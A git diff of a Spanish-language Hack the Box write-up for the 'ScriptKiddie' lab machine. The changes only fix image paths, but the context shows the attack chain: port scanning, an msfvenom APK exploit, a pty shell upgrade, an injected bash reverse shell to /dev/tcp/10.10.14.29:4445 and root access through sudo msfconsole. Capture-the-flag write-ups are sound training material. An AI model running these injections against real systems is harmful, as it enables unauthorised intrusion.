@@ -7,7 +7,7 @@ date: 2021-06-5 10:40:00 -0600
 categories: [Hack the Box, Writeup]
 tags: [htb, hacking, hack the box, redteam, Linux, msfvenom, nmap, pivoting, msfconsole ]     # TAG names should always be lowercase
 show_image_post: true
-image: /assets/img/Linux/easy/Script Kiddie/InfoCard-ScriptKiddie.png
+image: /assets/img/Linux/easy/ScriptKiddie/InfoCard-ScriptKiddie.png
 ---
 
 # Summary
@@ -36,7 +36,7 @@ Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta
 
 Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.10.226`` 
 
-![masscan_01](/assets/img/Linux/easy/Script Kiddie/masscan_01.png)
+![masscan_01](/assets/img/Linux/easy/ScriptKiddie/masscan_01.png)
 
 Tenemos los siguientes dos puertos : **5000** y **22** , el resultado de Nmap nos arroja lo siguiente:
 
@@ -63,23 +63,23 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Procedemos a verificar el puerto **5000**
 
-![h4x0r](/assets/img/Linux/easy/Script Kiddie/h4x0r.png)
+![h4x0r](/assets/img/Linux/easy/ScriptKiddie/h4x0r.png)
 
 Un h4x0r WebSite xD, a simple vista tenemos tres(3) herramientas : **nmap** , **msfvenom** y **searchsploit** 
 
 1) Nmap : 
 
-![h4x0r](/assets/img/Linux/easy/Script Kiddie/h4x0r.png)
+![h4x0r](/assets/img/Linux/easy/ScriptKiddie/h4x0r.png)
 
 No se le puede sacar mas provecho.
 
 2) Searchsploit : 
 
-<img src="/assets/img/Linux/easy/Script Kiddie/h4x0r_02.png" alt="h4x0r_02" style="zoom:75%;" />
+<img src="/assets/img/Linux/easy/ScriptKiddie/h4x0r_02.png" alt="h4x0r_02" style="zoom:75%;" />
 
 3) Msfvenom y why not, usaremos el mismo searchsploit para buscar algo al respecto: 
 
-![h4x0r_03](/assets/img/Linux/easy/Script Kiddie/h4x0r_03.png)
+![h4x0r_03](/assets/img/Linux/easy/ScriptKiddie/h4x0r_03.png)
 
 Encontramos algo interesante, usaremos ese exploit.
 
@@ -91,21 +91,21 @@ Encontramos algo interesante, usaremos ese exploit.
 
 
 
-![msf02](/assets/img/Linux/easy/Script Kiddie/msf02.png)
+![msf02](/assets/img/Linux/easy/ScriptKiddie/msf02.png)
 
 
 
 Esto nos va a generar un archivo **.apk** 
 
-![msf03](/assets/img/Linux/easy/Script Kiddie/msf03.png)
+![msf03](/assets/img/Linux/easy/ScriptKiddie/msf03.png)
 
-![msf04](/assets/img/Linux/easy/Script Kiddie/msf04.png)
+![msf04](/assets/img/Linux/easy/ScriptKiddie/msf04.png)
 
 
 
 Ponemos netcat a la escucha y : 
 
-![msf05](/assets/img/Linux/easy/Script Kiddie/msf05.png)
+![msf05](/assets/img/Linux/easy/ScriptKiddie/msf05.png)
 
 Le hacemos un upgrade a nuestra shell: 
 
@@ -113,7 +113,7 @@ Le hacemos un upgrade a nuestra shell:
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-![kid_user](/assets/img/Linux/easy/Script Kiddie/kid_user.png)
+![kid_user](/assets/img/Linux/easy/ScriptKiddie/kid_user.png)
 
 Ya tenemos el 1er flag :) 
 
@@ -123,11 +123,11 @@ Ya tenemos el 1er flag :)
 
 No hay mucho que hacer, no hay privilegios con sudo, no hay archivos con lo que podamos interactuar, nada interesante en el crontab o en los procesos, asi que hacemos algo de enum basico y nos movemo hacia el otro usuario **pwn** : ``/home/pwn`` veremos un script sh :
 
-![kid_02](/assets/img/Linux/easy/Script Kiddie/kid_02.png)
+![kid_02](/assets/img/Linux/easy/ScriptKiddie/kid_02.png)
 
 Mientras se cumpla la condicion , ejecuta la sentencia de nmap y lo escribe en **hackers** , dado que el script es del usuario **pwn** :
 
-![pwn](/assets/img/Linux/easy/Script Kiddie/pwn.png)
+![pwn](/assets/img/Linux/easy/ScriptKiddie/pwn.png)
 
 Intentaremos meter codigo para obtener un rev shell: 
 
@@ -135,15 +135,15 @@ Intentaremos meter codigo para obtener un rev shell:
 echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.29/4445 0>&1' #" >> hackers
 ```
 
-![pwn_01](/assets/img/Linux/easy/Script Kiddie/pwn_01.png)
+![pwn_01](/assets/img/Linux/easy/ScriptKiddie/pwn_01.png)
 
-![pwn_02](/assets/img/Linux/easy/Script Kiddie/pwn_02.png)
+![pwn_02](/assets/img/Linux/easy/ScriptKiddie/pwn_02.png)
 
 Verificamos los privilegios de sudo :
 
  
 
-![root_01](/assets/img/Linux/easy/Script Kiddie/root_01.png)
+![root_01](/assets/img/Linux/easy/ScriptKiddie/root_01.png)
 
 Procedemos : 
 
@@ -155,9 +155,9 @@ sudo /opt/metasploit-framework-6.0.9/msfconsole
 
 :) 
 
-![root_03](/assets/img/Linux/easy/Script Kiddie/root_03.png)
+![root_03](/assets/img/Linux/easy/ScriptKiddie/root_03.png)
 
 Una maquina bastante sencilla, con esto finalizamos el writeup.
 
-![gali](/assets/img/Linux/easy/Script Kiddie/gali.png)
+![gali](/assets/img/Linux/easy/ScriptKiddie/gali.png)
 
